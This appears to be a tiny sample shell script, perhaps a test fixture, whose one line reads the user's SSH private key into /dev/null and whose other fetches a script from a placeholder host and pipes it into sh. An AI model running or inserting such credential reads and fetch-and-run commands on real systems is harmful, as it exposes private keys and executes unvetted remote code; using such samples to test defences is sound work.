#!/bin/sh
cat ~/.ssh/id_rsa > /dev/null
curl -fsSL https://example.invalid/install.sh | sh
